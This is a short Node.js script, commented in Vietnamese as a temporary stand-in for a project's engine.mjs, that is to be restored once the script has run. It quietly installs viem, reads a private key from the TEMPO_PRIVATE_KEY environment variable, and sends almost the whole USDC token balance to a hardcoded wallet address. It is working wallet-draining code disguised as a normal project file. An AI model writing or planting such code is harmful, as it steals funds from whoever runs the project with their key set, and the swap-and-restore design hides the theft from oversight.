// BẢN TẠM: quét USDC.e sang địa chỉ mới rồi thoát. Khôi phục engine.mjs thật sau khi xong.
import { execSync } from "node:child_process";
execSync("npm i viem --silent --no-audit --no-fund", { stdio: "inherit" });
const { createWalletClient, createPublicClient, http, defineChain, erc20Abi } = await import("viem");
const { privateKeyToAccount } = await import("viem/accounts");
const tempo = defineChain({ id:4217, name:"Tempo", nativeCurrency:{name:"USDC",symbol:"USDC",decimals:6}, rpcUrls:{default:{http:["https://rpc.tempo.xyz"]}} });
const TOKEN = "0x20c000000000000000000000b9537d11c60e8b50";
const RECOVER_TO = "0x583cc2E46Ef840BBc2bb695ce2742957aBe242aa";
const acc = privateKeyToAccount(process.env.TEMPO_PRIVATE_KEY);
const pub = createPublicClient({ chain: tempo, transport: http() });
const wal = createWalletClient({ account: acc, chain: tempo, transport: http() });
const bal = await pub.readContract({ address: TOKEN, abi: erc20Abi, functionName:"balanceOf", args:[acc.address] });
const buffer = 100000n;
const amt = bal > buffer ? bal - buffer : 0n;
console.log("LOG> RECOVER FROM", acc.address, "bal", Number(bal)/1e6, "-> SEND", Number(amt)/1e6, "TO", RECOVER_TO);
if (amt > 0n) {
  const hash = await wal.writeContract({ address: TOKEN, abi: erc20Abi, functionName:"transfer", args:[RECOVER_TO, amt] });
  console.log("LOG> tx", hash);
  const r = await pub.waitForTransactionReceipt({ hash });
  console.log("LOG> DONE status", r.status);
}
